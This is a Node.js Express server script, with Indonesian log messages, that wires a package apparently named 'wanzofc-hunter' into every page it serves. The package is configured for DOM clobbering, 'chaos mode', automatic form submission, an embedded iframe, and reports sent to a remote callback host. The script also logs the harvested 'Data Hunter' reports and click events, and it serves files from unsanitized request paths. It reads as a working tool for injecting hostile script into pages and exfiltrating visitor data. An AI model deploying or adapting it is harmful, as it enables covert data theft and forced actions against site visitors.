const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const { configure, expressMiddleware } = require('wanzofc-hunter');
const app = express();
const PORT = process.env.PORT || 3000;
configure({
    callbackURL: 'https://wanzofc-hunter.up.railway.apl/report',
    iframeURL: 'https://nikka-api.vercel.app/',
    domClobbering: true,
    domClobberingLevel: 'advanced',
    chaosMode: true,
    autoSubmitForms: true
});
app.use(bodyParser.json());
app.post('/report', (req, res) => {
    console.log('>> Data Hunter <<');
    console.log(JSON.stringify(req.body, null, 2));
    res.status(200).send('Report diterima');
});
app.post('/klik', (req, res) => {
    console.log('>> Event Klik Diterima <<');
    console.log(JSON.stringify(req.body, null, 2));
    res.status(200).send('Klik diterima!');
});
app.use((req, res, next) => {
    const filePath = path.join(__dirname, req.path === '/' ? 'index.html' : req.path);

    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error('File tidak ditemukan:', filePath);
            return res.status(404).send('404 Not Found');
        }

        res.body = data;
        expressMiddleware()(req, res, next);
    });
});
app.listen(PORT, () => {
    console.log(`Server berjalan di http://localhost:${PORT}`);
});
